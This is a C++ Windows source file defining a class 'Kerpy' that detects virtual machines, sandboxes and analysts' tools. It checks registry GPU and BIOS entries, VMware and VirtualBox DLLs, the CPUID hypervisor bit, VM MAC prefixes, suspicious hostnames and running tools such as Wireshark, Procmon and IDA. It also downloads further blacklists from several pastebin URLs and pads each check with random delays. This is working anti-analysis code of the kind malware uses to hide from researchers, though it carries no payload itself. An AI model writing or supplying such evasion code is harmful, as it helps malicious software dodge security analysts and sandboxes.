#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <array>
#include <algorithm>
#include <random>
#include <thread>
#include <chrono>
#include <memory>
#include <Windows.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <TlHelp32.h>
#include <intrin.h>
#include <wininet.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

class Kerpy {
private:
    std::vector<std::pair<std::string, bool>> results;
    
    std::string fetchFromUrl(const std::string& url) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(50, 200);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::unique_ptr<char[]> buffer = std::make_unique<char[]>(16384);
        std::stringstream response;
        
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (hConnect) {
                DWORD bytesRead = 0;
                while (InternetReadFile(hConnect, buffer.get(), 16384 - 1, &bytesRead) && bytesRead > 0) {
                    buffer[bytesRead] = 0;
                    response << buffer.get();
                    
                    std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
        
        return response.str();
    }
    
    std::vector<std::string> extractListFromUrl(const std::string& url) {
        std::string content = fetchFromUrl(url);
        std::stringstream ss(content);
        std::vector<std::string> list;
        std::string line;
        
        while (std::getline(ss, line)) {
            if (!line.empty()) {
                line.erase(std::remove_if(line.begin(), line.end(), 
                           [](unsigned char c) { return c == '\r' || c == '\n'; }), line.end());
                list.push_back(line);
            }
        }
        
        return list;
    }
    
    std::string executeCommand(const std::string& cmd) {
        std::array<char, 256> buffer;
        std::string result;
        
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
        if (!pipe) {
            return "";
        }
        
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        
        return result;
    }
    
    std::string getMACAddress() {
        IP_ADAPTER_INFO* pAdapterInfo = static_cast<IP_ADAPTER_INFO*>(malloc(sizeof(IP_ADAPTER_INFO)));
        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
        
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = static_cast<IP_ADAPTER_INFO*>(malloc(ulOutBufLen));
        }
        
        std::string macAddress;
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            std::stringstream ss;
            for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
                if (i > 0) ss << ":";
                ss << std::hex << std::setw(2) << std::setfill('0') 
                   << static_cast<int>(pAdapterInfo->Address[i]);
            }
            macAddress = ss.str();
        }
        
        free(pAdapterInfo);
        return macAddress;
    }
    
    std::string getIPAddress() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return "0.0.0.0";
        }
        
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            WSACleanup();
            return "0.0.0.0";
        }
        
        hostent* host = gethostbyname(hostname);
        if (host == NULL) {
            WSACleanup();
            return "0.0.0.0";
        }
        
        std::string ipAddress = inet_ntoa(*(struct in_addr*)*host->h_addr_list);
        
        WSACleanup();
        return ipAddress;
    }
    
    std::string getSystemGuid() {
        HKEY hKey;
        std::string machineGuid;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                          "SOFTWARE\\Microsoft\\Cryptography", 
                          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[255];
            DWORD bufferSize = sizeof(buffer);
            DWORD type;
            
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, &type,
                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                machineGuid = std::string(buffer);
            }
            
            RegCloseKey(hKey);
        }
        
        return machineGuid;
    }
    
    std::string getHostname() {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            return std::string(hostname);
        }
        return "Unknown";
    }
    
    std::string getGpuInfo() {
        HKEY hKey;
        std::string gpuDesc;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256];
            DWORD bufferSize = sizeof(buffer);
            DWORD type;
            
            if (RegQueryValueExA(hKey, "DriverDesc", NULL, &type,
                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                gpuDesc = std::string(buffer);
            }
            
            RegCloseKey(hKey);
        }
        
        return gpuDesc;
    }
    
    std::string getBiosInfo(const std::string& value) {
        HKEY hKey;
        std::string result;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "HARDWARE\\DESCRIPTION\\System\\BIOS", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256];
            DWORD bufferSize = sizeof(buffer);
            DWORD type;
            
            if (RegQueryValueExA(hKey, value.c_str(), NULL, &type,
                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                result = std::string(buffer);
            }
            
            RegCloseKey(hKey);
        }
        
        return result;
    }
    
    std::vector<std::string> getRunningProcesses() {
        std::vector<std::string> processList;
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    processList.push_back(std::string(pe32.szExeFile));
                } while (Process32Next(hSnapshot, &pe32));
            }
            
            CloseHandle(hSnapshot);
        }
        
        return processList;
    }
    
    std::string getDiskSerialNumber() {
        std::string output = executeCommand("wmic diskdrive get serialnumber");
        std::istringstream stream(output);
        std::string line;
        std::getline(stream, line);
        std::getline(stream, line);
        line.erase(std::remove_if(line.begin(), line.end(), isspace), line.end());
        return line;
    }

    void systemDelayCheck() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(100, 500);
        
        auto start = std::chrono::high_resolution_clock::now();
        int delay = dist(gen);
        Sleep(delay);
        auto end = std::chrono::high_resolution_clock::now();
        
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
        
        if (std::abs(elapsed - delay) > delay * 0.2) {
            results.push_back(std::make_pair("System timing analysis failed", true));
        }
    }

public:
    void registryCheck() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(10, 50);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256];
            DWORD bufferSize = sizeof(buffer);
            DWORD type;
            
            std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
            
            if (RegQueryValueExA(hKey, "DriverDesc", NULL, &type,
                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                std::string driverDesc = std::string(buffer);
                std::transform(driverDesc.begin(), driverDesc.end(), driverDesc.begin(), ::toupper);
                
                if (driverDesc.find("VMWARE") != std::string::npos || 
                    driverDesc.find("VIRTUAL") != std::string::npos || 
                    driverDesc.find("VBOX") != std::string::npos) {
                    results.push_back(std::make_pair("Graphics driver verification failed", true));
                }
            }
            
            bufferSize = sizeof(buffer);
            if (RegQueryValueExA(hKey, "ProviderName", NULL, &type,
                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                std::string providerName = std::string(buffer);
                std::transform(providerName.begin(), providerName.end(), providerName.begin(), ::toupper);
                
                if (providerName.find("VMWARE") != std::string::npos || 
                    providerName.find("VIRTUAL") != std::string::npos || 
                    providerName.find("INNOTEK") != std::string::npos) {
                    results.push_back(std::make_pair("Graphics provider verification failed", true));
                }
            }
            
            RegCloseKey(hKey);
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    void processesAndFilesCheck() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(15, 60);
        
        std::string vmwareDll = getenv("SystemRoot");
        vmwareDll += "\\System32\\vmGuestLib.dll";
        std::string virtualboxDll = getenv("SystemRoot");
        virtualboxDll += "\\vboxmrxnp.dll";
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        if (GetFileAttributesA(vmwareDll.c_str()) != INVALID_FILE_ATTRIBUTES) {
            results.push_back(std::make_pair("System library integrity check failed (VM1)", true));
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        if (GetFileAttributesA(virtualboxDll.c_str()) != INVALID_FILE_ATTRIBUTES) {
            results.push_back(std::make_pair("System library integrity check failed (VM2)", true));
        }
        
        std::vector<std::string> processList = getRunningProcesses();
        
        std::vector<std::string> suspiciousProcesses = {
            "VMwareService.exe", "VMwareTray.exe", "VBoxService.exe", "VBoxTray.exe", 
            "wireshark.exe", "processhacker.exe", "procmon.exe", "procmon64.exe", 
            "procexp.exe", "procexp64.exe", "idaq.exe", "idag.exe"
        };
        
        for (const auto& process : suspiciousProcesses) {
            std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen) / 3));
            if (std::find(processList.begin(), processList.end(), process) != processList.end()) {
                results.push_back(std::make_pair("Process security validation failed: " + process, true));
            }
        }
        
        HMODULE sandboxieDll = LoadLibraryA("SbieDll.dll");
        if (sandboxieDll != NULL) {
            results.push_back(std::make_pair("Runtime environment security check failed", true));
            FreeLibrary(sandboxieDll);
        }
        
        try {
            std::vector<std::string> blacklistedProcesses = extractListFromUrl("https://pastebin.com/raw/Xe5WMsTU");
            for (const auto& proc : blacklistedProcesses) {
                if (std::find(processList.begin(), processList.end(), proc) != processList.end()) {
                    results.push_back(std::make_pair("Extended process validation failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
    }

    void macCheck() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(20, 70);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::string macAddress = getMACAddress();
        
        std::vector<std::string> vmMacPrefixes = {
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "00:15:5D", 
            "08:00:27", "52:54:00", "00:16:3E"
        };
        
        for (const auto& prefix : vmMacPrefixes) {
            if (macAddress.substr(0, prefix.length()) == prefix) {
                results.push_back(std::make_pair("Network adapter verification failed", true));
                break;
            }
        }
        
        try {
            std::vector<std::string> blacklistedMacs = extractListFromUrl("https://pastebin.com/raw/ftd50eAq");
            for (const auto& mac : blacklistedMacs) {
                if (macAddress.substr(0, mac.length()) == mac) {
                    results.push_back(std::make_pair("Extended network verification failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    void checkPc() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(15, 55);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::string hostname = getHostname();
        
        std::vector<std::string> suspiciousNames = {
            "VIRTUAL", "VMWARE", "VPS", "VBOX", "SANDBOX", "SAMPLE", "TEST", 
            "ANALYSIS", "MALWARE", "VIRUS", "SECURITY", "DESKTOP"
        };
        
        std::string uppercaseHostname = hostname;
        std::transform(uppercaseHostname.begin(), uppercaseHostname.end(), uppercaseHostname.begin(), ::toupper);
        
        for (const auto& name : suspiciousNames) {
            if (uppercaseHostname.find(name) != std::string::npos) {
                results.push_back(std::make_pair("System identity verification failed", true));
                break;
            }
        }
        
        try {
            std::vector<std::string> blacklistedNames = extractListFromUrl("https://pastebin.com/raw/jnEaykLU");
            for (const auto& name : blacklistedNames) {
                if (hostname == name) {
                    results.push_back(std::make_pair("Extended hostname verification failed", true));
                    break;
                }
            }
            
            std::vector<std::string> blacklistedUsernames = extractListFromUrl("https://pastebin.com/raw/Vgztru48");
            std::string username;
            char usernameBuffer[256];
            DWORD usernameSize = sizeof(usernameBuffer);
            if (GetUserNameA(usernameBuffer, &usernameSize)) {
                username = std::string(usernameBuffer);
            }
            
            for (const auto& blackUsername : blacklistedUsernames) {
                if (username == blackUsername) {
                    results.push_back(std::make_pair("User account verification failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    void hwidVm() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(20, 80);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::string machineGuid = getSystemGuid();
        
        std::vector<std::string> suspiciousGuids = {
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111"
        };
        
        for (const auto& guid : suspiciousGuids) {
            if (machineGuid == guid) {
                results.push_back(std::make_pair("System identifier validation failed", true));
                break;
            }
        }
        
        try {
            std::vector<std::string> blacklistedHwids = extractListFromUrl("https://pastebin.com/raw/E5pwq7NH");
            for (const auto& hwid : blacklistedHwids) {
                if (machineGuid == hwid) {
                    results.push_back(std::make_pair("Extended identifier validation failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
        
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);
        bool hypervisorPresent = (cpuInfo[2] >> 31) & 1;
        
        if (hypervisorPresent) {
            results.push_back(std::make_pair("CPU validation failed (hypervisor present)", true));
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    void checkGpu() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(25, 60);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::string gpuDesc = getGpuInfo();
        std::string upperGpuDesc = gpuDesc;
        std::transform(upperGpuDesc.begin(), upperGpuDesc.end(), upperGpuDesc.begin(), ::toupper);
        
        std::vector<std::string> suspiciousGpus = {
            "VMWARE", "VIRTUAL", "VGA", "REMOTEFX", "BASIC DISPLAY", "STANDARD VGA", 
            "PARALLELS", "HYPER-V", "MICROSOFT BASIC DISPLAY", "VBOX"
        };
        
        for (const auto& gpu : suspiciousGpus) {
            if (upperGpuDesc.find(gpu) != std::string::npos) {
                results.push_back(std::make_pair("Graphics hardware validation failed", true));
                break;
            }
        }
        
        try {
            std::vector<std::string> blacklistedGpus = extractListFromUrl("https://pastebin.com/raw/LSpkCfqc");
            for (const auto& gpu : blacklistedGpus) {
                if (gpuDesc == gpu) {
                    results.push_back(std::make_pair("Extended graphics validation failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    void checkIp() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(30, 90);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::string ipAddress = getIPAddress();
        
        std::vector<std::string> suspiciousIpRanges = {
            "10.0.", "192.168.", "127.0."
        };
        
        for (const auto& ipRange : suspiciousIpRanges) {
            if (ipAddress.find(ipRange) == 0) {
                results.push_back(std::make_pair("Network environment validation failed", true));
                break;
            }
        }
        
        try {
            std::vector<std::string> blacklistedIps = extractListFromUrl("https://pastebin.com/raw/tDXxxRUc");
            for (const auto& ip : blacklistedIps) {
                if (ipAddress == ip) {
                    results.push_back(std::make_pair("Extended network validation failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    void profiles() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(20, 70);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        
        std::string machineGuid = getSystemGuid();
        std::string biosVendor = getBiosInfo("SystemManufacturer");
        std::string biosVersion = getBiosInfo("BIOSVersion");
        std::string diskSerial = getDiskSerialNumber();
        
        std::vector<std::string> suspiciousBiosVendors = {
            "VMWARE", "INNOTEK", "VIRTUALBOX", "MICROSOFT CORPORATION", "PARALLELS"
        };
        
        std::string upperBiosVendor = biosVendor;
        std::transform(upperBiosVendor.begin(), upperBiosVendor.end(), upperBiosVendor.begin(), ::toupper);
        
        for (const auto& vendor : suspiciousBiosVendors) {
            if (upperBiosVendor.find(vendor) != std::string::npos) {
                results.push_back(std::make_pair("BIOS verification failed", true));
                break;
            }
        }
        
        try {
            std::vector<std::string> blacklistedGuids = extractListFromUrl("https://pastebin.com/raw/vrkN6wA1");
            for (const auto& guid : blacklistedGuids) {
                if (machineGuid == guid) {
                    results.push_back(std::make_pair("Extended GUID validation failed", true));
                    break;
                }
            }
            
            std::vector<std::string> blacklistedBios = extractListFromUrl("https://pastebin.com/raw/T1x6YGbZ");
            for (const auto& bios : blacklistedBios) {
                if (biosVersion == bios) {
                    results.push_back(std::make_pair("Extended BIOS validation failed", true));
                    break;
                }
            }
            
            std::vector<std::string> blacklistedDisks = extractListFromUrl("https://pastebin.com/raw/VcuTddgf");
            for (const auto& disk : blacklistedDisks) {
                if (diskSerial == disk) {
                    results.push_back(std::make_pair("Storage device validation failed", true));
                    break;
                }
            }
        } catch (...) {
            // Continue execution
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }
    
    void runAllChecks() {
        systemDelayCheck();
        registryCheck();
        processesAndFilesCheck();
        macCheck();
        checkPc();
        hwidVm();
        checkGpu();
        checkIp();
        profiles();
    }
    
    bool isAnalysisEnvironmentDetected() {
        for (const auto& result : results) {
            if (result.second) {
                return true;
            }
        }
        return false;
    }
    
    std::vector<std::string> getFailedChecks() {
        std::vector<std::string> failedChecks;
        for (const auto& result : results) {
            if (result.second) {
                failedChecks.push_back(result.first);
            }
        }
        return failedChecks;
    }
};